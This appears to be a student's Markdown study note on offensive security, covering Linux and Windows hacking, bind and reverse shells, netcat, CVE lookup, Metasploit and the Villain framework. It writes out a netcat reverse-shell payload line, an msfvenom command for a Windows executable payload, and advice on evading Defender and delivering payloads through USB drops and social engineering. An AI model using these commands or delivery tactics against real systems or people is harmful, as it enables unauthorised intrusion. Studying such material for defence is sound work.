## What is system Hacking

- *System hacking* is the method that hackers use to gain access to computers on a network. Ethical hackers can use these techniques to learn system hacking skills in order to counter, detect, and prevent these types of attacks.
- The malware and the attacker identify and exploit the vulnerability of the computer system to gain unauthorized access.

### Linux System Hacking
- As we know, Linux is considered to be the most secure OS to be hacked or cracked, but in the world of Hacking, *nothing is 100% secured*.
- Hackers usually use the following techniques to hack the Linux system :
     1. Hack Linux using the *shadow file*.
     2. SSH key leak
     3. Remote Code Executions ( RCE )
     4. Another commonly used technique is to bypass the *user password* option in Linux. ( Privilege Escalation )
     5. Another technique, the hacker detects the bug on the kernel and tries to take advantage of it.

- The user password of Window OS, when you log in lets users protect the computer from getting unauthorized access.
- Choosing a strong password of more than eight digits is an excellent practice.
- There are several tricks and techniques to crack a windows password. But from the hacker's point of view, if you can use social engineer your victim and find a Windows computer open, you can easily modify the existing password without the victim being unaware.
- There is a simple method to bypass Windows login :

#### Windows Pen-test
- Understanding Windows is a very broad topic.
- We have to learn the Windows Systems too.
- You have to learn :
     1. fundamental of Windows
     2. PowerShell Scripting and usage.
     3. Managing Services, Users
     4. Active Directory system.

### Shell
- *Shell* : is a program that interprets our commands and gives the written commands to the kernel.
- Based on *Remote access* to the shell while Pen-testing, it is classified into :

#### 1. Bind shell
- *Bind Shell* is type of shell where the remote machine initiates a connection to the target machine, allowing the attacker to control the target system. 
- A type of shell that listens on a specific port and waits for incoming connections, allowing the user to execute commands on the target system from a remote location.
- In bind shell, *an attacker launches a service on the target computer*, to which the attacker can connect.
- To launch a bind shell, *the attacker must have the IP address of the victim* to access the target computer.

     3. https://medium.com/@S3Curiosity/understanding-shell-reverse-shell-and-bind-shell-a-comprehensive-guide-6bad2169edbd
#### 2. Reverse shell
- Reverse shell is also known as *remote shell* or *connect-back shell* ,takes advantage of the target *system's vulnerabilities* to initiate a shell session and then access the victim's computer.
- A *reverse shell* attack is a type of cyberattack where a threat actor establishes a connection from a target machine (the victim's) to their machine. Reverse shell attacks are often executed via TCP and, in rare cases, ICMP or UDP.

### Netcat 
- *Netcat* is a networking tool for reading from and writing to network connections. It's called the “Swiss Army Knife” of networking due to its range of functions. Netcat establishes TCP and UDP connections with remote hosts. This allows communication between devices over a network.
- It is a command-line interface (CLI) based tool that is used to *read / write* data over TCP/UDP. 
     - To listen on ports
     - To create connection on ports
- It is a *back-end* tool which can smoothly be cross utilized by other programs.
- Used to create a connection with any protocol / port you want or to create a listener on any port.
- It is a tool that helps to create *Reverse shell* or *Bind shell*. 
- It is built in on *Kali* and *Parrot* but for windows you have to download it.

     4. https://www.geeksforgeeks.org/practical-uses-of-ncnetcat-command-in-linux/

- Syntax :
     1. for creating listening port :
         -  *netcat  -nlvp  port_number*         [[Pasted image 20240601152834.png]]
     2. When you write your payload you write this :
         -  *nc  Ip_add  port_no   -e  /bin/bash*

## Web Servers

- A *web server* is software and hardware that uses HTTP (Hypertext Transfer Protocol) and other protocols to respond to client requests made over the World Wide Web.
- References :
     1. https://www.techtarget.com/whatis/definition/Web-server
     2. https://www.geeksforgeeks.org/web-server-and-its-type/

- There are a lot of software that can be installed on the server to work like web server.
### 1. Apache Server
- This server software will help to provide Web contents.
- On *Linux* it comes *built in*.
- On *Windows* you can install it using *Xampp* and *Wampp* software and it give you *localhost* web contents.
- To start this server software :
     -   *sudo  systemctl   start  apache2*
        - from now on our computer is acting like a *webserver*  and the default port is *80*.
        - by running our Ip on a browser we can get a website.
        - The default path of apache2 is */var/www/html*.
### 2. Python Server
- We can use python to start web servers.
- To start the service :
     -  *python3  -m  http.server  port_no*
- The python will help you to host website from any path on your computer with any port you need.

## CVE 

- *Common Vulnerabilities and Exposures (CVE)* is a database of publicly disclosed information security issues. A CVE number uniquely identifies one vulnerability from the list.
- The glossary analyzes vulnerabilities and then uses the common vulnerability scoring system (CVSS) to evaluate the threat level of a vulnerability.
- It is leveled as :
     -   *CVE-YEAR-ID*
     -  *CVE-2019-22321* 
- CVSS uses the following metric and rating value :
     1. [[Pasted image 20240601161738.png]] 
     2. [[Pasted image 20240601161816.png]]

### ExploitDB
- It is maintained by OffSec.
- The *Exploit Database* is a CVE compliant archive of public exploits and corresponding vulnerable software, developed for use by penetration testers and vulnerability researchers. 
- The website :     https://exploit-db.com 
- There is a Kali too called *searchsploit* used to search from ExploitDB server, and get the exploit.
##### Note : 
- Be cautious of the *False positives* - exploits that are fake.
- website used for searching CVE ID -  https://www.cvedetails.com/


## Metasploit

- The *Metasploit* framework is a very powerful tool which can be used by cybercriminals as well as ethical hackers to probe systematic vulnerabilities on networks and servers.
- Because it's an open-source framework, it can be easily customized and used with most operating systems.
- It is written with *Ruby*.
- It has a lot of exploits for different kind of vulnerabilities and CVE's.
- It provides you with :
     - *Exploits*
     - *Payloads* :  program that runs after exploiting / getting reverse-shell
     - *Auxiliary* :  program that helps to scan further on the system.
     - *Encoders* :  
     - *Listeners* :
     - *Post-exploitation codes* :  used to run after we exploit

     4. [[Pasted image 20240601181255.png]]
- On kali / parrot it is built in.
- To start Metasploit :
     -   *msfconsole* 
     -  *msfconsole  -q*        -  to skip the banner
    
- We can do the following using Metasploit :
### 1. Search for any exploit
- We can search for any exploit using Metasploit.
- Syntax :
     -  msf6 >  *search  keyword* 
### 2. Create a payload - for windows
- We will use Metasploit feature called *msfvenom* to create a payload.
- Syntax :
     - *msfvenom  -p  payload_name  LHOST=Ip  LPORT=port_no  -f exe  >  name* 
     - Ex.  [[Pasted image 20240601182630.png]] 
### 3. Create an exploit - listener
1. On Metasploit we search for an exploit called *Multi / handler*. 
2. To use the exploit :
     -  *use   exploit_name*      or      *use  exploit_number* 
3. set LHOST 
     -  *set  LHOST  Ip_add*
4. set LPORT 
     -  *set  LPORT  port_no*
5. Now run your exploit using :
     -  *run*   or    *exploit* 
#### To see details on Metasploit
- *show  option*     --  to see options
- *show info*      -- to see info about the exploit

### Problem with Metasploit
- Metasploit is very old tool and even the encoder are very old.
- This means almost every user has tried them and exploited systems with them but nowadays all antiviruses and Microsoft defends will stop them and detect them.
- But it is still handy tool for other *exploitation* and *scanning*.

- If you want to test the encoders you just add *-e* and the *encoder name* from the list and create the payload. Ex.    [[Pasted image 20240601185345.png]] 

### Using other new frameworks 
- At this time, there are some Frameworks, that can bypass Microsoft defender.
- The tool is called *Villain* - clone it from GitHub -  https://github.com/t3l3machus/Villain
- Villain is good for :
     - Creating Payloads
     - No need to setup listener
     - You can share the session you got with your friends and hack together.
- How to create payload see the pictures given :
     1. [[Pasted image 20240601191544.png]] 
     2. [[Pasted image 20240601191613.png]] 
- To see the session ( hacked computers ) see the pic :
     1. [[Pasted image 20240601191822.png]]  

### We don't get the victims PowerShell ???
- Now it is time to think like a hacker and start to prepare a plan on you will give the payload to the person.
- There are several ways :
     1. You can create *exe* file from that payload
     2. You can build / get a autorun USB and do USB drop attack.
     3. You can do social engineering and help them to run it by their own.
- You can use a *PowerShell to EXE converter* using this website : https://ps2exe.azurewebsites.net/
